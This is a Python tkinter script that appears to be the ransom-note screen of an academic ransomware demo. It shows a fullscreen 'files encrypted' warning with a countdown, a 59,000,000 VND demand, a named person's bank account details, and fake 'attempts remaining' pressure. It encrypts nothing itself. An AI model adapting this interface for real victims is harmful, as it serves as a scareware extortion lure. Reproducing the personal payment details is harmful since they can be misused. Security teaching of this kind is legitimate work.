import random
import socket
import tkinter as tk

DEMO_CODE = 'DEMO-SAFE-2024-TMDT'

BG     = '#0a0a0a'
FG     = '#ff3333'
FG_DIM = '#cccccc'
FG_MUT = '#888888'
AMBER  = '#ffaa00'
GRN    = '#44ff44'
BG2    = '#130000'
BORDER = '#ff3333'


class FakeRansomApp:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title('⚠ YOUR FILES HAVE BEEN ENCRYPTED')
        self.root.attributes('-fullscreen', True)
        self.root.configure(bg=BG)

        outer = tk.Frame(self.root, bg=BORDER)
        outer.pack(fill='both', expand=True, padx=3, pady=3)
        main = tk.Frame(outer, bg=BG)
        main.pack(fill='both', expand=True, padx=2, pady=2)

        main.columnconfigure(0, weight=1)
        main.rowconfigure(2, weight=1)

        # ── Row 0: Header ─────────────────────────────────
        hdr = tk.Frame(main, bg=BG)
        hdr.grid(row=0, column=0, sticky='ew', pady=(18, 6))

        tk.Label(hdr, text='💀', font=('Courier New', 60),
                 bg=BG, fg=FG).pack()
        self._title_label = tk.Label(
            hdr, text='YOUR FILES HAVE BEEN ENCRYPTED',
            font=('Courier New', 22, 'bold'), bg=BG, fg=FG)
        self._title_label.pack(pady=(4, 6))
        tk.Label(
            hdr,
            text='All data in your system has been encrypted.'
                 '   Files: invoice_2024.txt   customer_data.csv   contract.txt   +5 more',
            font=('Courier New', 11), bg=BG, fg=FG_MUT, justify='center',
        ).pack()

        # ── Row 1: Timer ──────────────────────────────────
        timer_frame = tk.Frame(main, bg=BG)
        timer_frame.grid(row=1, column=0, sticky='ew', pady=(6, 6))

        self._seconds_left = 72 * 3600 - 1
        self._timer_var = tk.StringVar()
        self._update_timer_display()
        tk.Label(timer_frame, textvariable=self._timer_var,
                 font=('Courier New', 54, 'bold'), bg=BG, fg=AMBER).pack()
        tk.Label(timer_frame,
                 text='TIME REMAINING — KEY WILL BE PERMANENTLY DELETED AT ZERO',
                 font=('Courier New', 10), bg=BG, fg=FG_MUT).pack()

        # ── Row 2: Payment ────────────────────────────────
        pay_wrap = tk.Frame(main, bg=BG2)
        pay_wrap.grid(row=2, column=0, sticky='nsew', padx=50, pady=(4, 10))
        pay_wrap.columnconfigure(0, weight=1)
        pay_wrap.rowconfigure(3, weight=1)

        tk.Label(pay_wrap,
                 text='💳  PAYMENT INFORMATION TO RECEIVE DECRYPT CODE',
                 font=('Courier New', 13, 'bold'), bg=BG2, fg=FG, pady=10
                 ).grid(row=0, column=0)
        tk.Frame(pay_wrap, bg=FG, height=1).grid(row=1, column=0, sticky='ew')

        info_area = tk.Frame(pay_wrap, bg=BG2)
        info_area.grid(row=2, column=0, pady=(12, 0))

        try:
            computer_name = socket.gethostname()
        except Exception:
            computer_name = 'YOUR-PC'

        rows = [
            ('Bank',           'BIDV — PGD Moc Chau'),
            ('Account Owner',  'VU TRUNG DUC'),
            ('Account Number', '4120271561'),
            ('Transfer Note',  f'UNLOCK {computer_name}'),
            ('After payment',  'Email: support@promanager.io'),
        ]
        for i, (lbl, val) in enumerate(rows):
            tk.Label(info_area, text=lbl, font=('Courier New', 12),
                     bg=BG2, fg=FG_MUT, anchor='w', width=20
                     ).grid(row=i, column=0, sticky='w', pady=2, padx=(10, 0))
            tk.Label(info_area, text=val, font=('Courier New', 12),
                     bg=BG2, fg=FG_DIM, anchor='w'
                     ).grid(row=i, column=1, sticky='w')

        tk.Frame(pay_wrap, bg=FG, height=1).grid(row=3, column=0, sticky='ew', pady=(14, 0))

        # Big total amount
        total_frame = tk.Frame(pay_wrap, bg=BG2)
        total_frame.grid(row=4, column=0, sticky='nsew', pady=(12, 16))
        pay_wrap.rowconfigure(4, weight=1)

        tk.Label(total_frame, text='TOTAL AMOUNT',
                 font=('Courier New', 15, 'bold'), bg=BG2, fg=FG).pack(expand=True)
        tk.Label(total_frame, text='59,000,000 VND',
                 font=('Courier New', 48, 'bold'), bg=BG2, fg=AMBER).pack(expand=True)

        # ── Row 3: Unlock ─────────────────────────────────
        unlock = tk.Frame(main, bg=BG)
        unlock.grid(row=3, column=0, sticky='ew', pady=(0, 8))

        tk.Label(unlock, text='Enter decrypt code received after payment:',
                 font=('Courier New', 11), bg=BG, fg=FG_MUT).pack()
        code_row = tk.Frame(unlock, bg=BG)
        code_row.pack(pady=(6, 0))

        self._code_var = tk.StringVar()
        entry = tk.Entry(
            code_row, textvariable=self._code_var,
            bg='#1a1a1a', fg=FG, insertbackground=FG,
            font=('Courier New', 13), relief='flat',
            highlightthickness=1, highlightcolor=FG,
            highlightbackground='#330000', width=28,
        )
        entry.pack(side='left', ipady=7)
        entry.bind('<Return>', lambda e: self._check_code())

        tk.Button(
            code_row, text='UNLOCK FILES',
            bg=FG, fg='#000000', font=('Courier New', 12, 'bold'),
            relief='flat', padx=18, pady=7,
            activebackground='#cc0000', activeforeground='#000000',
            cursor='hand2', command=self._check_code,
        ).pack(side='left', padx=(10, 0))

        self._result_var = tk.StringVar()
        self._result_label = tk.Label(
            unlock, textvariable=self._result_var,
            font=('Courier New', 11), bg=BG, fg=FG)
        self._result_label.pack(pady=(6, 0))

        # ── Row 4: Demo badge ─────────────────────────────
        tk.Label(main, text='⚠  DEMO ONLY — Academic Environment',
                 font=('Courier New', 9), bg=BG, fg=GRN
                 ).grid(row=4, column=0, pady=(0, 8))

        self._start_timer()
        self._start_blink()

    def _update_timer_display(self):
        h = self._seconds_left // 3600
        m = (self._seconds_left % 3600) // 60
        s = self._seconds_left % 60
        self._timer_var.set(f'{h:02d}:{m:02d}:{s:02d}')

    def _start_timer(self):
        if self._seconds_left > 0:
            self._seconds_left -= 1
        self._update_timer_display()
        self.root.after(1000, self._start_timer)

    def _start_blink(self):
        current = self._title_label.cget('fg')
        next_color = BG if current == FG else FG
        self._title_label.configure(fg=next_color)
        self.root.after(800, self._start_blink)

    def _check_code(self):
        code = self._code_var.get().strip()
        if code == DEMO_CODE:
            self._result_label.configure(fg=GRN)
            self._result_var.set(
                '✓ Code correct! Files are being decrypted...'
                '  Run: python3 defender/decryptor.py shop_data/'
            )
        else:
            attempts_left = random.randint(1, 5)
            self._result_label.configure(fg=FG)
            self._result_var.set(f'✗ Wrong code. {attempts_left} attempts remaining.')

    def run(self):
        self.root.mainloop()


if __name__ == '__main__':
    FakeRansomApp().run()
